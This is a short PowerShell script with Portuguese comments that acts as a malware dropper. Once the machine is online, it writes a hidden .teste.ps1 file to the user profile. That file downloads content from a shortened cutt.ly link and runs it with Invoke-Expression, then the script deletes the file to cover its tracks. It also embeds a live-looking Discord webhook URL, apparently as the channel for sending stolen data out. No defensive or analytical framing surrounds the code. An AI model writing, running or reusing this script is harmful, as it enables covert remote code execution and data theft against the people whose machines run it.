# Função para verificar a conectividade de rede
function Test-InternetConnection {
    try {
        $null = Test-Connection -ComputerName "www.google.com" -Count 1 -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# Verificar a conectividade de rede
if (-not (Test-InternetConnection)) {
    while (-not (Test-InternetConnection)) {
        Start-Sleep -Seconds 10
    }
}

# Conexão de rede disponível. Executar o script aqui...
# Define o conteúdo do arquivo PowerShell
$dc = 'https://discord.com/api/webhooks/1185172334592655371/r9YAVpnfPK_W5z5D4F0WmkdFO6j7Vo7kSofgED4Ntol0ht1z_ZSMTZkJD7KcdoP30J1V'
$scriptContent = @"
Start-Sleep -Milliseconds 500
`$dc = '$dc'
Invoke-Expression (Invoke-WebRequest -Uri "http://cutt.ly/ClankPT" -UseBasicParsing).Content
"@

# Obter o diretório do perfil do usuário logado
$userProfileDir = $env:USERPROFILE

# Caminho completo do arquivo, incluindo o nome e a extensão
$filePath = Join-Path -Path $userProfileDir -ChildPath ".teste.ps1"

# Cria o arquivo com o conteúdo especificado e define o atributo Hidden
$scriptContent | Out-File -FilePath $filePath -Encoding utf8
Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Executa o script
& $filePath

# Apaga o arquivo após a execução do script
Remove-Item -Path $filePath -Force

